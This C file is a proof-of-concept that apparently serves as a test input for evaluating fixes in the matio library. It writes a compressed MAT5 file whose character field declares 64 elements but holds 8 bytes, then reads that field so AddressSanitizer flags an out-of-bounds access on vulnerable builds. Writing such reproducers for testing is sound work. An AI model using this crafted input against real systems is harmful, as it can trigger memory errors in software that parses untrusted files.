/*
 * PoC input for the multi-commit evaluation case (matio).
 *
 * Crafts a MAT5 file holding a zlib-compressed 1x1 struct with a single
 * character field "c" whose declared dimensions are {64,1} but whose
 * UTF-8 data element stores only 8 bytes, then reads the variable
 * through the public API and slab-reads the field data.
 *
 * Build:  gcc -g -fsanitize=address -fno-omit-frame-pointer \
 *             -I<src> -I<build>/src probe.c <build>/libmatio.a -lz -lm
 * Run:    ./probe   (aborts with an AddressSanitizer report on a tree
 *                    where the defect is present; exits cleanly on a
 *                    tree where the field is rejected or unsupported)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>
#include "matio.h"

#define POC_PATH "/tmp/matio_poc_struct_char.mat"

#if defined(__SANITIZE_ADDRESS__)
#define PROBE_ASAN 1
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
#define PROBE_ASAN 1
#endif
#endif

#ifdef PROBE_ASAN
const char *__asan_default_options(void)
{
    /* make the sanitizer report fatal (abort) when it fires */
    return "abort_on_error=1";
}
#endif

static uint8_t *dbuf;
static size_t dlen, dcap;

static void
dput(const void *p, size_t n)
{
    if ( dlen + n > dcap ) {
        dcap = (dlen + n) * 2 + 256;
        dbuf = (uint8_t *)realloc(dbuf, dcap);
        if ( dbuf == NULL )
            exit(2);
    }
    memcpy(dbuf + dlen, p, n);
    dlen += n;
}

static void
du32(uint32_t v)
{
    dput(&v, 4);
}

/* miMATRIX subelement: full tag + payload padded to an 8-byte boundary */
static void
subelem(uint32_t type, const void *p, uint32_t n)
{
    static const uint32_t zero[2] = {0, 0};
    du32(type);
    du32(n);
    if ( n )
        dput(p, n);
    if ( n % 8 )
        dput(zero, 8 - (n % 8));
}

static void
write_file(void)
{
    uint8_t hdr[128];
    uint8_t *deflated = NULL;
    uLongf dsize = 0;
    FILE *f;
    uint32_t tag[2];
    size_t i, pad;

    memset(hdr, 0, sizeof(hdr));
    memcpy(hdr, "MATLAB 5.0 MAT-file, crafted test case", 38);
    /* version 0x0100 little-endian, endian indicator "IM" */
    hdr[124] = 0x00;
    hdr[125] = 0x01;
    hdr[126] = 'I';
    hdr[127] = 'M';

    /* --- payload of the compressed struct element --- */
    /* array flags: miUINT32, class MAT_C_STRUCT (2) */
    {
        uint32_t fl[2] = {2, 0};
        subelem(6, fl, 8);
    }
    /* dims: miINT32 {1, 1} */
    {
        uint32_t d[2] = {1, 1};
        subelem(5, d, 8);
    }
    /* name: miINT8 "s" */
    subelem(1, "s", 1);
    /* field name length: packed small element miINT32, value 2 */
    du32(5u | (4u << 16));
    du32(2);
    /* field name list: packed small element miINT8, "c\0" */
    du32(1u | (2u << 16));
    du32((uint32_t)'c');

    /* field miMATRIX: char, dims {64,1}, empty name, UTF-8 data "hellowor" */
    du32(14); /* MAT_T_MATRIX */
    du32(16 + 16 + 8 + 16);
    {
        uint32_t fl[2] = {4, 0}; /* MAT_C_CHAR */
        subelem(6, fl, 8);
    }
    {
        uint32_t d[2] = {64, 1};
        subelem(5, d, 8);
    }
    subelem(1, "", 0); /* empty field name element */
    subelem(16, "hellowor", 8); /* miUTF8 */

    /* --- prepend the inner miMATRIX tag, then deflate --- */
    {
        static const uint32_t mtag[2] = {14, 0};
        uint32_t plen = (uint32_t)dlen;
        uint8_t *inner = (uint8_t *)malloc(dlen + 8);
        if ( inner == NULL )
            exit(2);
        memcpy(inner, mtag, 8);
        memcpy(inner + 4, &plen, 4);
        memcpy(inner + 8, dbuf, dlen);
        free(dbuf);
        dbuf = inner;
        dlen += 8;
    }

    /* --- deflate the payload --- */
    dsize = compressBound(dlen);
    deflated = (uint8_t *)malloc(dsize);
    if ( deflated == NULL )
        exit(2);
    if ( compress2(deflated, &dsize, dbuf, (uLong)dlen, Z_BEST_SPEED) != Z_OK )
        exit(2);

    f = fopen(POC_PATH, "wb");
    if ( f == NULL )
        exit(2);
    fwrite(hdr, 1, sizeof(hdr), f);

    /* compressed miMATRIX element */
    tag[0] = 15; /* miMATRIX */
    tag[1] = (uint32_t)dsize;
    fwrite(tag, 4, 2, f);
    fwrite(deflated, 1, dsize, f);
    pad = (8 - (dsize % 8)) % 8;
    for ( i = 0; i < pad; i++ )
        fputc(0, f);

    fclose(f);
    free(deflated);
}

int
main(void)
{
    mat_t *mat;
    matvar_t *svar, *cvar;
    int start[2] = {0, 0};
    int stride[2] = {1, 1};
    int edge[2] = {64, 1};
    char out[4096];
    int err;

    write_file();

    mat = Mat_Open(POC_PATH, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        printf("Mat_Open failed\n");
        return 1;
    }

    svar = Mat_VarReadInfo(mat, "s");
    if ( svar == NULL ) {
        printf("Mat_VarReadInfo failed\n");
        Mat_Close(mat);
        return 1;
    }
    printf("struct class=%d rank=%d\n", svar->class_type, svar->rank);

    cvar = Mat_VarGetStructFieldByName(svar, "c", 0);
    if ( cvar == NULL ) {
        printf("no field\n");
        Mat_VarFree(svar);
        Mat_Close(mat);
        return 1;
    }
    printf("field class=%d type=%d nbytes=%zu dims=%zux%zu\n", cvar->class_type,
           cvar->data_type, cvar->nbytes, cvar->dims[0], cvar->dims[1]);

    memset(out, 0, sizeof(out));
    err = Mat_VarReadData(mat, cvar, out, start, stride, edge);
    printf("Mat_VarReadData err=%d out[0..7]=%.8s\n", err, out);

    Mat_VarFree(svar);
    Mat_Close(mat);
    return 0;
}
